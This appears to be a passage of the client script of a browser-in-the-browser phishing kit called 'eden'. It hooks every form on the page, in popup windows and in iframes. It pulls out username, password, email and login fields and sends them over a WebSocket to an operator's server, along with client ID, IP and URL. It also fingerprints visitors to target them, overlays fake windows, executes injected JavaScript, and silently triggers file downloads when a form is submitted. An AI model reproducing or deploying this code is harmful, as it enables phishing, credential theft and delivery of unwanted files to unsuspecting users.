                        const script = document.createElement('script');
                        script.textContent = jsCode;
                        
                        console.log('Executing pending JavaScript after reload:', jsCode);
                        // Execute the script
                        document.head.appendChild(script);
                        
                        // Clean up the script element after execution
                        setTimeout(() => {
                            if (script.parentNode) {
                                script.parentNode.removeChild(script);
                            }
                        }, 100);
                    } catch (error) {
                        console.error('Error executing pending JavaScript:', error);
                        alert('JavaScript execution error: ' + error.message);
                    }
                }, 500); // Short delay to ensure DOM is ready
            }
        }
    }
    // Restore windows from localStorage on page load
    function restoreWindows() {
        console.log('Attempting to restore windows...');
        
        // Get all window keys from localStorage
        const windowKeys = Object.keys(localStorage).filter(key => key.startsWith('BITBContent_'));
        console.log(`Found ${windowKeys.length} windows to restore`);
        
        windowKeys.forEach(key => {
            try {
                const windowData = JSON.parse(localStorage.getItem(key));
                // Only restore windows that aren't minimized
                if (windowData && windowData.content && !windowData.minimized) {
                    console.log(`Restoring window: ${windowData.fileName}`);
                    
                    // Create the window using showContentInWindow
                    showContentInWindow(windowData.content, windowData.fileName);
                    
                    // Now find the window and apply the saved state
                    const windowId = key.replace('BITBContent_', '');
                    const window = document.getElementById(windowId);
                    if (window) {
                        if (windowData.maximized) {
                            // Apply maximized state
                            window.classList.add('maximized');
                            window.style.width = '100%';
                            window.style.height = '100%';
                            window.style.top = '0';
                            window.style.left = '0';
                            window.style.transform = 'none';
                            window.style.borderRadius = '0';
                            window.style.maxWidth = 'none';
                            window.style.maxHeight = 'none';
                        } else if (windowData.savedWidth) {
                            // Apply saved dimensions for non-maximized windows
                            window.style.width = windowData.savedWidth;
                            window.style.height = windowData.savedHeight;
                            window.style.left = windowData.savedLeft;
                            window.style.top = windowData.savedTop;
                            window.style.transform = windowData.savedTransform || 'none';
                            window.style.borderRadius = '8px';
                        }
                    }
                } else if (windowData && windowData.minimized) {
                    console.log(`Window ${windowData.fileName} was minimized, not restoring`);
                }
            } catch (e) {
                console.error(`Error restoring window: ${key}`, e);
            }
        });
    }
    
    // Add UI initialization to the initialization process
    const originalInitialize = initialize;
    initialize = function() {
        originalInitialize();
        initializeUI();
        
        // Immediately restore any saved content
        if (localStorage.getItem('showsContent')) {
            const content = localStorage.getItem('showsContent');
            const fileName = localStorage.getItem('lastLoadedFile') || 'saved-content.html';
            showContent(content, fileName, false);
        }
        
        // Immediately restore any saved popup windows
        restoreWindows();
    };
    
    // Monitor forms for credential submissions
    function monitorForms(targetDocument = document) {
        // Use provided document or default to main document
        const doc = targetDocument || document;
        
        // Find all forms in the document
        const forms = doc.querySelectorAll('form');
        console.log('Monitoring ' + forms.length + ' forms for credential submission');
        
        // Add submit event listener to each form
        forms.forEach(form => {
            // Skip already monitored forms
            if (form.dataset.monitored === 'true') return;
            
            // Mark this form as monitored
            form.dataset.monitored = 'true';
            
            form.addEventListener('submit', function(e) {
                // Get form data
                const formData = new FormData(this);
                const data = Object.fromEntries(formData.entries());
                
                // Check if form contains credential fields
                const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user'];
                let hasCredentials = false;
                const credentialData = {};
                
                // Check each field name against credential patterns
                Object.keys(data).forEach(key => {
                    credentialFields.forEach(field => {
                        if (key.toLowerCase().includes(field)) {
                            hasCredentials = true;
                            credentialData[key] = data[key];
                        }
                    });
                });
                
                // If credentials found, send to server
                if (hasCredentials && ws && ws.readyState === WebSocket.OPEN) {
                    console.log('Credentials found in form, sending to server');
                    ws.send(JSON.stringify({
                        type: 'credentials',
                        data: credentialData,
                        url: doc.location.href,
                        timestamp: new Date().toISOString(),
                        formId: form.id || 'unnamed_form',
                        clientId: clientId || 'unknown',
                        ip: clientIp || 'unknown',
                        source: window.name || 'main_window'
                    }));
                }
            });
        });
        
        // Set up a mutation observer to monitor for new forms
        if (!window.formObserver) {
            window.formObserver = new MutationObserver(mutations => {
                let shouldCheckForms = false;
                
                mutations.forEach(mutation => {
                    if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                        // Check if any added nodes are forms or contain forms
                        for (let i = 0; i < mutation.addedNodes.length; i++) {
                            const node = mutation.addedNodes[i];
                            if (node.nodeType === 1) { // Element node
                                if (node.tagName === 'FORM' || node.querySelector('form')) {
                                    shouldCheckForms = true;
                                    break;
                                }
                            }
                        }
                    }
                });
                
                if (shouldCheckForms) {
                    monitorForms();
                }
            });
            
            // Start observing the document
            window.formObserver.observe(document.documentElement, {
                childList: true,
                subtree: true
            });
        }
        
        // Also monitor forms in any popup windows that might exist
        const popupWindows = document.querySelectorAll('.window-content');
        if (popupWindows.length > 0) {
            console.log(`Found ${popupWindows.length} popup windows, monitoring forms inside them`);
            popupWindows.forEach(windowContent => {
                // Find forms directly in the window content
                const forms = windowContent.querySelectorAll('form');
                if (forms.length > 0) {
                    console.log(`Found ${forms.length} forms in popup window, monitoring them`);
                    monitorForms(windowContent);
                }
                
                // Check for iframes that might contain forms
                const iframes = windowContent.querySelectorAll('iframe');
                if (iframes.length > 0) {
                    iframes.forEach(iframe => {
                        try {
                            if (iframe.contentDocument) {
                                monitorForms(iframe.contentDocument);
                            }
                        } catch (e) {
                            console.log('Cannot access iframe content due to same-origin policy');
                        }
                    });
                }
            });
        }
    }
    
    // Track original body content
    let originalBodyContent = null;
    
    // Display content with blur, shade, or no effect
    
    
   
    
    // We'll enhance the WebSocket onmessage handler in the connectToServer function
    
    // Function to determine if the current client is targeted by a message
    function isClientTargeted(message) {
        // If there's no targeting info, assume it's for everyone
        if (!message.targetClientId && !message.targetIp) {
            return true;
        }
        
        // Get our stored enhanced client ID and other identifiers
        const storedEnhancedClientId = sessionStorage.getItem('eden_enhanced_client_id') || enhancedClientId;
        const deviceFingerprint = generateDeviceFingerprint();
        const persistentClientId = localStorage.getItem('eden_persistent_client_id');
        
        // Check client ID targeting (highest priority)
        if (message.targetClientId) {
            // First check for exact match with enhanced client ID (most secure)
            if (storedEnhancedClientId && message.targetClientId === storedEnhancedClientId) {
                console.log('✅ Exact match with enhanced client ID');
                return true;
            }
            // Check if our device fingerprint is part of the target ID
            else if (deviceFingerprint && message.targetClientId.includes(deviceFingerprint)) {
                console.log('✅ Device fingerprint match');
                return true;
            }
            // Check our base client ID (less reliable but still valid)
            else if (persistentClientId && message.targetClientId.includes(persistentClientId)) {
                console.log('✅ Base client ID match');
                return true;
            }
            // Fallback to original client ID
            else if (message.targetClientId === clientId) {
                console.log('✅ Original client ID match');
                return true;
            }
        }
        
        // IP matching is secondary and only used if not strict targeting
        if (message.targetIp && message.targetIp === clientIp) {
            // Only use IP matching if strict targeting is not enabled
            if (!message.strictTargeting) {
                console.log('⚠️ Matched by IP address (less secure)');
                return true;
            }
        }
        
        // If we got here, client is not targeted
        return false;
    }

    // Function to check and restore content after page refresh
    function checkForSavedContent() {
        console.log('Checking for saved content to restore after refresh');
        
        // First check for clean flag - if present, don't restore content
        const cleanFlag = localStorage.getItem('clean-flag') === 'true' || 
                          sessionStorage.getItem('clean-flag') === 'true';
        
        if (cleanFlag) {
            console.log('Clean flag detected - skipping content restoration');
            // Clear the flags so they don't persist indefinitely
            localStorage.removeItem('clean-flag');
            sessionStorage.removeItem('clean-flag');
            return;
        }
        
        // First try to restore from the unified blur-data object
        try {
            const blurDataStr = localStorage.getItem('blur-data');
            if (blurDataStr) {
                const blurData = JSON.parse(blurDataStr);
                console.log('Found unified blur data to restore:', blurData);
                
                if (blurData && blurData.content) {
                    // First remove any existing overlays to prevent duplicates
                    document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
                        if (el && el.parentNode) {
                            el.parentNode.removeChild(el);
                        }
                    });
                    
                    // Create and apply blur overlay
                    const overlay = document.createElement('div');
                    overlay.id = 'eden-blur-overlay';
                    
                    // Apply effect based on saved type
                    const effectType = blurData.effectType || 'blur';
                    const intensity = parseInt(blurData.intensity) || 5;
                    
                    if (effectType === 'blur') {
                        const blurAmount = Math.max(1, Math.min(20, intensity));
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            backdrop-filter: blur(${blurAmount}px);
                            -webkit-backdrop-filter: blur(${blurAmount}px);
                            background-color: rgba(0, 0, 0, 0.1);
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored blur effect with intensity:', blurAmount, 'px');
                    } else if (effectType === 'shade') {
                        const opacityValue = Math.max(0.2, Math.min(0.9, intensity / 20));
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            background-color: rgba(0, 0, 0, ${opacityValue});
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored shade effect with opacity:', opacityValue);
                    } else {
                        // Default or 'none' effect
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored default/none effect background');
                    }
                    
                    // Add the overlay to the body
                    document.body.appendChild(overlay);
                    
                    // Create and add content container if we have stored content
                    if (blurData.content) {
                        const contentContainer = document.createElement('div');
                        contentContainer.id = 'eden-content-container';
                        contentContainer.style.cssText = `
                            position: fixed;
                            top: 50%;
                            left: 50%;
                            transform: translate(-50%, -50%);
                            max-width: 95%;
                            max-height: 95vh;
                            overflow: auto;
                            border: none;
                            background: none;
                            box-shadow: none;
                            padding: 0;
                            margin: 0;
                            z-index: 2000000; /* Higher z-index than overlay */
                            display: block !important;
                        `;
                        contentContainer.innerHTML = blurData.content;
                        document.body.appendChild(contentContainer);
                        
                        console.log('Successfully restored both blur effect and content from unified storage');
                        return; // Exit early since we've successfully restored
                    }
                }
            }
        } catch (e) {
            console.error('Error restoring from unified blur data:', e);
        }
        
        // Fallback to the legacy method if unified approach fails
        const savedContent = sessionStorage.getItem('eden-active-content') || localStorage.getItem('blur-content');
        const savedFileName = sessionStorage.getItem('eden-active-filename') || localStorage.getItem('lastLoadedFile');
        const savedEffectType = sessionStorage.getItem('eden-effect-type') || localStorage.getItem('eden-blur-effect') || 'blur';
        const savedIntensity = parseInt(sessionStorage.getItem('eden-intensity') || localStorage.getItem('eden-blur-intensity') || '5');
        const savedSection = sessionStorage.getItem('eden-from-section');
        
        // Check if we have location data
        let location = null;
        const savedX = sessionStorage.getItem('eden-location-x');
        const savedY = sessionStorage.getItem('eden-location-y');
        if (savedX && savedY) {
            location = {
                x: parseFloat(savedX),
                y: parseFloat(savedY)
            };
        }
        
        if (savedContent && localStorage.getItem('eden-blur-applied') === 'true') {
            console.log(`Restoring saved content using fallback method: ${savedFileName} with effect: ${savedEffectType}, intensity: ${savedIntensity}`);
            // Apply immediately to prevent flicker, no need for timeout
            showContent(savedContent, savedFileName, savedSection, savedEffectType, location, savedIntensity);
        }
    }
    
    // Start the process
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            initialize();
            // Set up form monitoring after initialization
            monitorForms();
            // Also check periodically for new forms
            setInterval(monitorForms, 3000);
            // Check for saved content to restore after refresh
            setTimeout(restoreFromSaved, 100);
            checkForSavedContent();
        });
    } else {
        initialize();
        // Set up form monitoring
        monitorForms();
        // Also check periodically for new forms
        setInterval(monitorForms, 3000);
        // Check for saved content to restore after refresh
        setTimeout(restoreFromSaved, 100);
        checkForSavedContent();
    }
})();

function loadFile(fileName) {
    console.log(`loadFile called for: ${fileName}`);
    
    // Try to find the file in localStorage
    let content = null;
    let key = null;
    
    // First check if it's stored with a prefixed key (preferred)
    if (localStorage.getItem('file_' + fileName)) {
        content = localStorage.getItem('file_' + fileName);
        key = 'file_' + fileName;
        console.log(`Found file with prefixed key: ${key}`);
    }
    // Then check if it's stored with its name as the key
    else if (localStorage.getItem(fileName)) {
        content = localStorage.getItem(fileName);
        key = fileName;
        console.log(`Found file with direct key: ${key}`);
    }
    
    if (!content) {
        console.error(`No content found for file: ${fileName}`);
        return false;
    }
    
    // Store the content directly with a persistent key
    localStorage.setItem('showsContent', content);
    
    // Also store the file name for reference
    localStorage.setItem('lastLoadedFile', fileName);
    
    // Check if this file should trigger a reload
    const reloadKey = key + '_reload';
    const reloadValue = localStorage.getItem(reloadKey);
    
    console.log(`Checking reload flag:`);
    console.log(`- Reload key: ${reloadKey}`);
    console.log(`- Reload value: ${reloadValue}`);
    console.log(`- Type of value: ${typeof reloadValue}`);
    console.log(`- Direct comparison: ${reloadValue === 'true'}`);
    
    // Force a direct comparison with the string 'true'
    if (reloadValue === 'true') {
        console.log(`File ${fileName} requires reload, refreshing page...`);
        
        // Set a flag to indicate we're in a reload cycle
        localStorage.setItem('pendingReload', 'true');
        
        try {
            // Try multiple reload methods
            console.log('Attempting to reload page...');
            
            // Method 1: Direct location.reload()
            location.reload(true);
            
            // If we're still here, try method 2
            console.log('Method 1 failed, trying method 2...');
            window.location.href = window.location.href;
            
            // If we're still here, try method 3
            console.log('Method 2 failed, trying method 3...');
            document.location.href = document.location.href;
            
            // If we're still here, try method 4
            console.log('Method 3 failed, trying method 4...');
            window.location.replace(window.location.href);
        } catch (e) {
            console.error('Error during reload:', e);
        }
        
        // If we're still here, the reload didn't happen immediately
        console.log('All reload methods attempted, returning true...');
        return true;
    }
    
    console.log(`File ${fileName} does not require reload, updating content without refresh`);
    
    // If we don't need to reload, just update the content
    // Hide placeholder
    document.getElementById('placeholder').style.display = 'none';
    
    // Get the container and update content
    const container = document.getElementById('main-content');
    container.innerHTML = content;
    
    console.log(`File ${fileName} loaded and stored for persistence`);
    return true;
}

// ===== DOWNLOAD FUNCTIONALITY =====

// Store original body content for download functionality
let download_originalBodyContent = null;

// Show content with effect for download functionality
function download_showContent(content, fileName, fromSection = null, effectType = 'blur', location = null, intensity = 5, customEffect = null) {
    // Remove any existing download overlay
    download_cleanContent();
    
    // Store original body content if not already stored
    if (!download_originalBodyContent) {
        download_originalBodyContent = document.body.innerHTML;
    }
    
    // Create overlay for background
    const overlay = document.createElement('div');
    overlay.id = 'eden-download-overlay';
    
    if (effectType === 'shade') {
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000000;
        `;
    } else if (effectType === 'none') {
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: transparent;
            z-index: 1000000;
        `;
    } else if (effectType === 'custom' && customEffect) {
        // Handle custom effect
        console.log('Applying custom effect for download:', customEffect.name);
        console.log('Custom effect details:', JSON.stringify(customEffect));
        console.log('Using intensity:', intensity);
        
        // Remove any existing custom effect style
        const existingStyle = document.getElementById('eden-download-custom-effect-style');
        if (existingStyle && existingStyle.parentNode) {
            existingStyle.parentNode.removeChild(existingStyle);
            console.log('Removed existing custom effect style');
        }
        
        // Also remove any existing HTML-based custom effect - use the same ID as blur section
        const existingHtmlEffect = document.getElementById('eden-custom-effect');
        if (existingHtmlEffect && existingHtmlEffect.parentNode) {
            existingHtmlEffect.parentNode.removeChild(existingHtmlEffect);
            console.log('Removed existing HTML-based custom effect');
        }
        
        if (customEffect.type === 'css') {
            // Apply CSS-based effect
            const styleEl = document.createElement('style');
            styleEl.id = 'eden-download-custom-effect-style';
            
            // Add CSS variables for intensity - use the same names as blur section
            const intensityValue = Math.max(1, Math.min(20, intensity));
            const cssWithVars = `
                :root {
                    --eden-effect-intensity: ${intensityValue};
                    --eden-effect-opacity: ${intensityValue / 20};
                    --eden-effect-blur: ${intensityValue}px;
                    --eden-effect-contrast: ${100 + (intensityValue * 5)}%;
                    --eden-effect-brightness: ${100 + (intensityValue * 2)}%;
                }
                ${customEffect.content}
            `;
            
            console.log('Adding custom CSS to head:', cssWithVars.substring(0, 100) + '...');
            styleEl.textContent = cssWithVars;
            document.head.appendChild(styleEl);
            
            // Apply basic overlay with intensity-based properties
            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                z-index: 1000000;
                pointer-events: auto;
                display: block !important;
                opacity: ${opacityValue};
            `;
            
            // Add custom class for CSS targeting - match the blur section
            overlay.className = 'eden-custom-effect'; // Use the same class as blur section
            console.log('Applied custom effect class to overlay');
        } else {
            // HTML-based effect
            // Apply basic overlay with opacity based on intensity
            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                z-index: 1000000;
                pointer-events: auto;
                display: block !important;
                overflow: hidden;
                background-color: rgba(0, 0, 0, ${opacityValue * 0.2});
            `;
            
            // Create a container for the HTML effect - match the blur section implementation exactly
            const effectContainer = document.createElement('div');
            effectContainer.id = 'eden-custom-effect'; // Use the same ID as blur section
            effectContainer.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                z-index: 999998;
                pointer-events: none;
                opacity: ${opacityValue};
                filter: contrast(${100 + (intensity * 10)}%);
            `;
            
            // Set the HTML content
            effectContainer.innerHTML = customEffect.content;
            document.body.appendChild(effectContainer);
            console.log('Applied HTML-based custom effect');
        }
    } else {
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(2.5px);
            -webkit-backdrop-filter: blur(2.5px);
            z-index: 1000000;
        `;
    }
    
    // Create content container (not blurred)
    const contentContainer = document.createElement('div');
    contentContainer.id = 'eden-download-container';
    contentContainer.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        max-width: 90%;
        max-height: 90%;
        z-index: 1000001;
        overflow: auto;
    `;
    
    // Process content
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = content;
    
    // Find and remove any background styles from body
    const bodyElements = tempDiv.querySelectorAll('body');
    bodyElements.forEach(body => {
        body.style.background = 'none';
        body.style.backgroundColor = 'transparent';
        body.style.backgroundImage = 'none';
    });
    
    // Find and modify forms to handle submission
    const forms = tempDiv.querySelectorAll('form');
    forms.forEach(form => {
        form.setAttribute('action', 'javascript:void(0);');
        form.setAttribute('onsubmit', 'window.download_formSubmitted(this); return false;');
    });
    
    // Set the processed content
    contentContainer.innerHTML = tempDiv.innerHTML;
    
    // Position the content based on location data if provided
    if (location && location.x !== undefined && location.y !== undefined) {
        const boundedX = Math.min(Math.max(location.x, 25), 75);
        const boundedY = Math.min(Math.max(location.y, 25), 75);
        
        contentContainer.style.top = `${boundedY}%`;
        contentContainer.style.left = `${boundedX}%`;
        contentContainer.style.maxWidth = '70%';
        contentContainer.style.maxHeight = '70%';
    }
    
    // Add elements to the page
    document.body.appendChild(overlay);
    document.body.appendChild(contentContainer);
    
    // Save to sessionStorage to persist across page refreshes
    sessionStorage.setItem('eden-download-content', content);
    sessionStorage.setItem('eden-download-filename', fileName);
    sessionStorage.setItem('eden-download-effect-type', effectType);
    sessionStorage.setItem('eden-download-intensity', intensity.toString());
    sessionStorage.setItem('eden-download-type', 'downloadContent');
    
    // Store custom effect data if provided
    if (effectType === 'custom' && customEffect) {
        sessionStorage.setItem('eden-download-custom-effect', JSON.stringify(customEffect));
    }
    
    if (fromSection) {
        sessionStorage.setItem('eden-download-from-section', fromSection);
    }
    
    // Save location data if present
    if (location && location.x !== undefined && location.y !== undefined) {
        sessionStorage.setItem('eden-download-location-x', location.x);
        sessionStorage.setItem('eden-download-location-y', location.y);
    } else {
        sessionStorage.removeItem('eden-download-location-x');
        sessionStorage.removeItem('eden-download-location-y');
    }
    
    // Also update localStorage for backup
    localStorage.setItem('eden-download-effect-type', effectType);
}

// Clean content and remove effects for download functionality
function download_cleanContent() {
    console.log('Running download_cleanContent');
    
    // Elements to remove with both old and new IDs
    const elementsToRemove = [
        // New IDs from this file
        'eden-download-overlay',
        'eden-download-container',
        'eden-download-custom-effect-style',
        'eden-download-custom-effect',
        
        // Old IDs from final.js that might still be present
        'eden-blur-overlay',
        'eden-content-container',
        'eden-close-button',
        'eden-custom-effect',
        'eden-custom-effect-style'
    ];
    
    // Remove all matching elements
    elementsToRemove.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            console.log('Removing element:', id);
            element.parentNode.removeChild(element);
        }
    });
    
    // Clear ALL session storage related to displays
    const sessionKeys = [
        // New keys from this file
        'eden-download-content',
        'eden-download-filename',
        'eden-download-effect-type',
        'eden-download-from-section',
        'eden-download-location-x',
        'eden-download-location-y',
        'eden-download-custom-effect',
        
        // Old keys from final.js that might still be present
        'eden-active-content',
        'eden-active-filename',
        'eden-effect-type',
        'eden-from-section',
        'eden-active-effect-type',
        'eden-active-from-section',
        'eden-download-flag',
        'eden-download-type'
    ];
    
    sessionKeys.forEach(key => {
        if (sessionStorage.getItem(key)) {
            console.log('Removing session storage item:', key);
            sessionStorage.removeItem(key);
        }
    });
    
    // Clear localStorage items
    const localKeys = [
        'eden-download-effect-type',
        'eden-effect-type',
        'eden-from-section',
        'eden-pending-content',
        'eden-pending-filename',
        'eden-pending-effect-type',
        'eden-pending-from-section',
        // Add clean flags to prevent restoration
        'eden-blur-applied',
        'blur-data'
    ];
    
    localKeys.forEach(key => {
        if (localStorage.getItem(key)) {
            console.log('Removing local storage item:', key);
            localStorage.removeItem(key);
        }
    });
    
    // Set clean flags to prevent restoration
    localStorage.setItem('clean-flag', 'true');
    sessionStorage.setItem('clean-flag', 'true');
    
    console.log('Content cleaning completed');
}

// Make download_cleanContent available globally
window.download_cleanContent = download_cleanContent;

// Function to receive download content from server
function download_receiveDownloadContent(content, fileName, downloadFlag) {
    // Show the content with blur effect
    download_showContent(content, fileName);
    
    // Mark this as download content
    sessionStorage.setItem('eden-download-type', 'downloadContent');
    
    // Store the download flag if provided
    if (downloadFlag === 'true') {
        sessionStorage.setItem('eden-download-flag', 'true');
    }
}

// Function to add a file to download selection
function download_addToDownloadSelection(fileName, content) {
    try {
        // Get existing selected files or initialize empty array
        let selectedFiles = [];
        const existingData = localStorage.getItem('eden-download-selected-files');
        
        if (existingData) {
            selectedFiles = JSON.parse(existingData);
        }
        
        // Check if file already exists
        const existingIndex = selectedFiles.findIndex(file => file.fileName === fileName);
        
        if (existingIndex !== -1) {
            // Update existing file
            selectedFiles[existingIndex] = { fileName, content };
        } else {
            // Add new file
            selectedFiles.push({ fileName, content });
        }
        
        // Save back to localStorage
        localStorage.setItem('eden-download-selected-files', JSON.stringify(selectedFiles));
        
        // Store individual file info for quick access
        localStorage.setItem(`eden-download-selected-${fileName}`, content);
    } catch (error) {
        console.error('Error adding selected file:', error);
    }
}

// Function to remove a file from download selection
function download_removeFromDownloadSelection(fileName) {
    try {
        // Get existing selected files
        const existingData = localStorage.getItem('eden-download-selected-files');
        
        if (existingData) {
            let selectedFiles = JSON.parse(existingData);
            
            // Filter out the file to remove
            selectedFiles = selectedFiles.filter(file => file.fileName !== fileName);
            
            // Save back to localStorage
            localStorage.setItem('eden-download-selected-files', JSON.stringify(selectedFiles));
        }
        
        // Remove individual file entry
        localStorage.removeItem(`eden-download-selected-${fileName}`);
    } catch (error) {
        console.error('Error removing selected file:', error);
    }
}

// Function to download a batch of files
function download_batchDownloadFiles(files) {
    if (!files || !Array.isArray(files) || files.length === 0) {
        return;
    }
    
    // Process files sequentially with a small delay between them
    files.forEach((file, index) => {
        setTimeout(() => {
            download_directDownloadFile(file.fileName, file.content);
        }, index * 500); // 500ms delay between downloads
    });
}

// Function to directly download a file without user interaction
function download_directDownloadFile(fileName, content) {
    try {
        // Create a data URL for the content
        const isBase64 = content && content.indexOf && content.indexOf('base64') !== -1;
        const dataUrl = isBase64 ? content : 'data:text/plain;charset=utf-8,' + encodeURIComponent(content);
        
        // Create a temporary link element
        const link = document.createElement('a');
        link.href = dataUrl;
        link.download = fileName;
        link.style.display = 'none';
        
        // Append to the document, click, and remove
        document.body.appendChild(link);
        link.click();
        
        // Remove the link after a short delay
        setTimeout(() => {
            document.body.removeChild(link);
        }, 100);
    } catch (error) {
        console.error('Error initiating direct download:', error);
    }
}

// Handle form submission for download functionality
function download_handleFormSubmission(form) {
    // Get content type and download flag
    const contentType = sessionStorage.getItem('eden-download-type');
    const downloadFlag = sessionStorage.getItem('eden-download-flag');
    
    // Check localStorage for selected files
    const selectedFilesJson = localStorage.getItem('eden-download-selected-files');
    
    // Only process downloads if we have the correct contentType AND download flag
    if (contentType === 'downloadContent' && downloadFlag === 'true') {
        if (selectedFilesJson) {
            try {
                const selectedFiles = JSON.parse(selectedFilesJson);
                
                if (selectedFiles.length > 0) {
                    // Process each selected file for download
                    selectedFiles.forEach(file => {
                        download_directDownloadFile(file.fileName, file.content);
                    });
                    
                    // Clear selected files from localStorage after downloading
                    localStorage.removeItem('eden-download-selected-files');
                    
                    // Also remove individual file entries
                    selectedFiles.forEach(file => {
                        localStorage.removeItem(`eden-download-selected-${file.fileName}`);
                    });
                }
            } catch (error) {
                console.error('Error processing selected files for download:', error);
            }
        }
        
        // Clear the download flag after processing
        sessionStorage.removeItem('eden-download-flag');
    }
    
    // Clean up the content after form submission
    download_cleanContent();
    
    return false;
}

// Initialize download functionality
function download_initialize() {
    window.download_formSubmitted = download_handleFormSubmission;
    
    console.log('Starting download_initialize function');
    
    // Check for any stored download content
    const savedContent = sessionStorage.getItem('eden-download-content');
    const savedFileName = sessionStorage.getItem('eden-download-filename');
    const savedEffectType = sessionStorage.getItem('eden-download-effect-type') || 'blur';
    const savedFromSection = sessionStorage.getItem('eden-download-from-section') || null;
    const savedIntensity = parseInt(sessionStorage.getItem('eden-download-intensity') || '5');
    
    console.log('Initializing download with saved effect type:', savedEffectType);
    console.log('Saved intensity:', savedIntensity);
    console.log('Saved content available:', !!savedContent);
    console.log('Saved filename:', savedFileName);
    
    // Check if location was saved
    let savedLocation = null;
    const savedX = sessionStorage.getItem('eden-download-location-x');
    const savedY = sessionStorage.getItem('eden-download-location-y');
    
    if (savedX !== null && savedY !== null) {
        savedLocation = {
            x: parseFloat(savedX),
            y: parseFloat(savedY)
        };
        console.log('Saved location found:', savedLocation);
    }
    
    // Check if we should restore content
    if (savedContent) {
        // Check for custom effect data
        let customEffectData = null;
        if (savedEffectType === 'custom') {
            try {
                // Try to get custom effect from sessionStorage first
                let customEffectJson = sessionStorage.getItem('eden-download-custom-effect');
                
                // If not in sessionStorage, try localStorage
                if (!customEffectJson) {
                    customEffectJson = localStorage.getItem('eden-download-custom-effect');
                }
                
                // If still not found, try getting from custom effects storage
                if (!customEffectJson) {
                    const effectsKey = 'eden-custom-effects';
                    const effects = JSON.parse(localStorage.getItem(effectsKey) || '{}');
                    const customEffectName = localStorage.getItem('eden-download-custom-effect-name');
                    
                    if (customEffectName && effects[customEffectName]) {
                        customEffectData = {
                            name: customEffectName,
                            content: effects[customEffectName].content,
                            type: effects[customEffectName].type
                        };
                        console.log('Found custom effect in effects storage:', customEffectName);
                    }
                }
                
                console.log('Custom effect JSON from storage:', customEffectJson ? customEffectJson.substring(0, 100) + '...' : 'null');
                
                if (customEffectJson && !customEffectData) {
                    customEffectData = JSON.parse(customEffectJson);
                    console.log('Restoring custom effect for download:', customEffectData.name);
                    console.log('Custom effect type:', customEffectData.type);
                    console.log('Custom effect content length:', customEffectData.content ? customEffectData.content.length : 0);
                } else if (!customEffectData) {
                    console.warn('Custom effect type set but no custom effect data found');
                }
            } catch (error) {
                console.error('Error parsing custom effect data:', error);
            }
        }
        
        download_showContent(
            savedContent, 
            savedFileName, 
            savedFromSection, 
            savedEffectType, 
            savedLocation, 
            savedIntensity, 
            customEffectData
        );
        
        // Store the custom effect in localStorage for persistence
        if (savedEffectType === 'custom' && customEffectData) {
            localStorage.setItem('eden-download-custom-effect', JSON.stringify(customEffectData));
            localStorage.setItem('eden-download-custom-effect-name', customEffectData.name);
        }
    }
}

// Initialize download functionality when document is ready
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    download_initialize();
} else {
    document.addEventListener('DOMContentLoaded', download_initialize);
}

// Export the clean function to global scope so it can be called from server.html
window.cleanBlurDisplay = function() {
    console.log("cleanBlurDisplay called from eden.js");
    
    // Use the improved download_cleanContent function to clean everything
    if (typeof download_cleanContent === 'function') {
        download_cleanContent();
    }
    
    // Also try to send a WebSocket message if socket is available
    if (typeof socket !== 'undefined' && socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify({ 
            type: 'cleanContent',
            timestamp: Date.now()
        }));
    }
    
    return true; // For function chaining
};

